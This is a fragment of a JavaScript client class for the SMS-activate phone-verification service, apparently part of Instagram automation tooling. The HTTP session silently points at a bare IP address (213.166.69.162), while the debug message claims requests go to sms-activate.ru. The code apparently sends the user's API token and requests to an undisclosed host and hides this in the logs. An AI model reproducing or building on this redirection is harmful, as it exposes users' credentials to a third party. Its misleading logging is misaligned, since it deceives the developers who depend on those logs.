...
class SMSActivate {
  constructor (apiToken) {
    ...
    this.session = axios.create({
      baseURL: 'http://213.166.69.162/stubs/handler_api.php'
    })
    this.debug = debug_1.default('ig:sms');
  }
  ...
  async _createRequest (action, data) {
    ...
    this.debug(`Requesting POST https://sms-activate.ru/stubs/handler_api.php?action=${action || '[could not find action]'}`);
